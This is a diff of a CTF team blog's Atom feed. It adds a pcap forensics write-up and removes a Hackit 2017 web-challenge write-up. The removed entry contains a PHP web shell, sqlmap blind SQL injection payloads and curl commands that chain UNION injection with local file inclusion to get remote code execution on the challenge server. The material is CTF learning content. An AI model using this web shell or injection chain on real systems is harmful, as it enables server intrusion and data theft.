@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-09-19T05:21:16.086Z</updated>
+  <updated>2017-09-19T10:29:02.105Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -14,6 +14,44 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[Forensics] CSAW - Missed Registration</title>
+    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/"/>
+    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/</id>
+    <published>2017-09-19T09:34:16.000Z</published>
+    <updated>2017-09-19T10:29:02.105Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>Missed Registration<br><br>It’s registration day! These forms just seem longer and longer…<br><br>UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.<br><br>UPDATE 2:58 Eastern: We’re regenerating due to flag leaks, submissions disabled until then. Please be patient.<br><br>Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!<br><br><a href="https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap" target="_blank" rel="external">https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap</a><br></blockquote>
+
+<p>We have a pcap file, at first we saw alot of <code>HTTP POST</code> requests:</p>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/O2U2weX.png" target="_blank" rel="external"><img src="https://i.imgur.com/O2U2weX.png" alt=""></a></p>
+<p>A lot of the form fields were filled with crap information in latin, at first we thought the parameter n was encrypted or some other kind of binary we extracted but we found nothing. After awhile instead of looking at HTTP form URL encoded tab from writeshark we started looking at TCP segment data and we found a new post param, a “x” parameter that only showed up in some of the requests:<br><a data-fancybox="gallery" href="https://i.imgur.com/jEzYqZz.png" target="_blank" rel="external"><img src="https://i.imgur.com/jEzYqZz.png" alt=""></a></p>
+<p>The very first HTTP POST requests has this value:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;x=424d923500000000000036040000280000004301000027000000010008000000000000000000c40e0000c40e00000001000000010000000001ff0c0e10ff0d1012ff131719ff161d21ff1b2226ff1c2b33ff1f313bff24292bff252c31ff2a3338ff33393bff243742ff283741ff</div></pre></td></tr></table></figure>
+<p>the beginning of this value “424d” indicated us that this might be an bmp image file! so we extracted all x’s values in one line bash command!:</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r cap.pcap -Y <span class="string">"http &amp;&amp; tcp.payload contains \"&amp;x=\""</span> -Tfields -e tcp.segment_data | tr -d <span class="string">':|\n'</span> | xxd -r -p | tr -d <span class="string">'x='</span> | xxd -r -p &gt; img.bmp</div></pre></td></tr></table></figure>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/Kr6Kxhh.png" target="_blank" rel="external"><img src="https://i.imgur.com/Kr6Kxhh.png" alt=""></a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;Missed Registration&lt;br&gt;&lt;br&gt;It’s registration day! These forms just seem longer and longer…&lt;br&gt;&lt;br&gt;UPDATE 10:44 Eastern: New 
+    
+    </summary>
+    
+      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
+    
+    
+      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
+    
+      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
+    
+      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
+    
+      <category term="bmp" scheme="https://teamrocketist.github.io/tags/bmp/"/>
+    
+  </entry>
   
   <entry>
     <title>[Pwn] CSAW - Pilot</title>
@@ -898,62 +936,6 @@
       <category term="encryption" scheme="https://teamrocketist.github.io/tags/encryption/"/>
     
       <category term="byte2byte" scheme="https://teamrocketist.github.io/tags/byte2byte/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Web] Hackit 2017 - V1rus3pidem1c 100</title>
-    <link href="https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/"/>
-    <id>https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/</id>
-    <published>2017-08-27T14:42:12.000Z</published>
-    <updated>2017-08-27T20:18:33.098Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>V1rus3pidem1c<br>web100<br><br>Wasted<br><br>16<br><br>Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!<br><br>Attachment: (none)<br><br>Webpage: <a href="http://tasks.ctf.com.ua:13372" target="_blank" rel="external">http://tasks.ctf.com.ua:13372</a><br>Hint: (none)<br></blockquote>
-
-<p>After interacting a little bit with the page we can start taking some notes about the website:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GET parameter &quot;Country&quot; (Possible attacks like SQLi, LFI or even bash injection).</div><div class="line">File Upload form (By uploading a PHP Script).  </div><div class="line">The uploaded files appear to be uploaded into uploads folder.</div></pre></td></tr></table></figure></p>
-<p>Lets try uploading a php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">&lt;pre&gt;<span class="keyword">if</span>($_GET[<span class="string">'cmd'</span>])&#123;system($_GET[<span class="string">'cmd'</span>]);&#125;&lt;/pre&gt;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>Running some curl commands to check the status code of the file we are about to upload:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'</span></div><div class="line">404</div></pre></td></tr></table></figure>
-<p>We got a 404 (not found) which is normal we still didn’t upload our php file so lets do it:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/index.php?country=Germany'</span> -F <span class="string">"fileToUpload=@/home/teamrocketist/D/H/dnjefwh43jfh342fnewjfjndewefnu27fd.php"</span></div><div class="line">200</div></pre></td></tr></table></figure>
-<p>Nice we got an 200 (OK) response! lets see if see if this is good news:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'</span></div><div class="line">200</div><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php?cmd=ls'</span></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]) &#123;</div><div class="line">  system(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</div><div class="line">  &#125;</div><div class="line">?&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
-<p>We can see we have some good and bad news we uploaded a php file with success! but our php file isn’t executing our php code and why this is happening? The admin must have configured in the apache configuration files to not run php in this specific upload folder(uploads) or it has a .htaccess inside it blocking it.  </p>
-<p>Actually you could solve this challenge very easily if you uploaded a .htaccess with your own rules overwriting the original .htaccess but this wasn’t the intentional solution, after a while the admins fixed this and protected the .htaccess file so it couldn’t get overwritten, but I believe some other teams managed to solve this challenge like this.  </p>
-<p>But continuing with the intentional solution, lets try to get what’s left from the notes we took before maybe we can try some sql injection?  </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">$ sqlmap -u "http://tasks.ctf.com.ua:13372/index.php?country=USA" <span class="comment">--tables --threads=10 --exclude-sysdbs --dump</span></div><div class="line"><span class="comment">---</span></div><div class="line">Parameter: country (GET)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</div><div class="line">    Payload: country=USA' AND 6412=6412 AND 'lvwC'='lvwC</div><div class="line"></div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</div><div class="line">    Payload: country=USA' AND SLEEP(5) AND 'buJa'='buJa</div><div class="line"><span class="comment">---</span></div><div class="line">[16:51:04] [INFO] the back-<span class="keyword">end</span> DBMS <span class="keyword">is</span> MySQL</div><div class="line">web <span class="keyword">server</span> operating <span class="keyword">system</span>: Linux Ubuntu</div><div class="line">web application technology: Apache <span class="number">2.4</span><span class="number">.7</span>, PHP <span class="number">5.5</span><span class="number">.9</span></div><div class="line">back-<span class="keyword">end</span> DBMS: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span></div><div class="line"><span class="keyword">Database</span>: WHATAREYOUDOINGHERE</div><div class="line">[<span class="number">1</span> <span class="keyword">table</span>]</div><div class="line">+<span class="comment">-----------+</span></div><div class="line">| countries |</div><div class="line">+<span class="comment">-----------+</span></div><div class="line"><span class="keyword">Database</span>: WHATAREYOUDOINGHERE</div><div class="line"><span class="keyword">Table</span>: countries</div><div class="line">[<span class="number">10</span> entries]</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div><div class="line">| countryID | scriptPath     | countryName  |</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div><div class="line">| <span class="number">1</span>         | country/ge.php | Germany      |</div><div class="line">| <span class="number">2</span>         | country/tu.php | Turkmenistan |</div><div class="line">| <span class="number">3</span>         | country/ne.php | Netherlands  |</div><div class="line">| <span class="number">4</span>         | country/se.php | Serbia       |</div><div class="line">| <span class="number">5</span>         | country/tk.php | Turkey       |</div><div class="line">| <span class="number">6</span>         | country/fr.php | France       |</div><div class="line">| <span class="number">7</span>         | country/uk.php | UK           |</div><div class="line">| <span class="number">8</span>         | country/ru.php | Russia       |</div><div class="line">| <span class="number">9</span>         | country/us.php | USA          |</div><div class="line">| <span class="number">10</span>        | country/ca.php | Canada       |</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div></pre></td></tr></table></figure>
-<p> And we got an Blind sql injection dump (Thanks you sqlmap for doing the boring part for us!), but after dumping the database we didn’t find anything special, but if we start thinking how the page is actually working behind this, we can see the admin is selecting the path to a country php file which contains the upload form and INCLUDES it on the index.php page!!!! and here is the key for this challenge! We can try to combine SQLi and LFI with a union technique injection!  </p>
-<ol>
-<li>Getting the column number:</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># successfully shows up a upload form!</span></div><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/index.php?country=Germany\'</span> order by 1-- qqq<span class="string">'</span></div><div class="line"><span class="string"># Doest show a upload form!</span></div><div class="line"><span class="string">$ curl '</span>http://tasks.ctf.com.ua:13372/index.php?country=Germany\<span class="string">' order by 2-- qqq'</span></div></pre></td></tr></table></figure>
-<ol>
-<li><p>Performing union injection and include /etc/passwd:</p>
-<p> <img src="https://i.imgur.com/JFXjJx1.png" alt="LFI AND SQLi"></p>
-</li>
-<li><p>Including our previous uploaded php script and and get remote code execution on the server!</p>
-</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">"http://tasks.ctf.com.ua:13372/index.php?cmd=ls -lta&amp;country=German' union all select 'uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php' -- frhQ"</span></div><div class="line"><span class="string">"truncated html code"</span></div><div class="line">total 72</div><div class="line">drwxrwxrwx 2 1002 1002 40960 Aug 27 21:16 uploads</div><div class="line">-r--r--r-- 1 1002 1002    49 Aug 27 07:36 .htaccess</div><div class="line">drwxrwxr-x 5 1002 1002  4096 Aug 25 20:26 .</div><div class="line">-r--r--r-- 1 1002 1002    44 Aug 25 20:26 iulersiueruigfuihseruhgi.php</div><div class="line">drwxrwxr-x 4 1002 1002  4096 Aug 25 13:59 ..</div><div class="line">-r--r--r-- 1 1002 1002  1667 Jul 28 20:54 index.php</div><div class="line">drwxrwxr-x 2 1002 1002  4096 Jul 28 03:35 country</div><div class="line">drwxrwxr-x 2 1002 1002  4096 Jul 28 03:34 static</div><div class="line"><span class="string">"truncated html code"</span></div></pre></td></tr></table></figure>
-<p>The flag was in the php file iulersiueruigfuihseruhgi.php:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/index.php?cmd=cat%20iulersiueruigfuihseruhgi.php&amp;country=German%27%20union%20all%20select%20%27uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php%27%20--%20frhQ'</span></div><div class="line"><span class="string">"truncated html code"</span></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="variable">$flag</span>=<span class="string">"h4ck1t&#123;<span class="variable">$QL</span>&amp;LFI=FR13ND$&#125;"</span>;</div><div class="line">?&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line"><span class="string">"truncated html code"</span></div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;V1rus3pidem1c&lt;br&gt;web100&lt;br&gt;&lt;br&gt;Wasted&lt;br&gt;&lt;br&gt;16&lt;br&gt;&lt;br&gt;Description: Hackers created an automated site for virus attacks on t
-    
-    </summary>
-    
-      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
-    
-    
-      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
-    
-      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
-    
-      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
     
   </entry>
   
